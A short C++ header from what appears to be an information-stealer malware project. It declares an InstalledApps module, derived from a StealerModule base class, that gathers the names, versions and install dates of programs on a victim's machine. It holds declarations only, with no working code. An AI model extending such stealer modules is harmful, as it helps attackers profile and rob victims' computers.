//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_INSTALLEDAPPS_H
#define STEALER_INSTALLEDAPPS_H


#include "../StealerModule.h"
#include <comdef.h>
#include <Wbemidl.h>

struct App
{
    std::string name;
    std::string version;
    std::string id;
    std::string installedDate;
};

class InstalledApps : public StealerModule {
public:
    void execute(fs::path &root) override;
};


#endif //STEALER_INSTALLEDAPPS_H
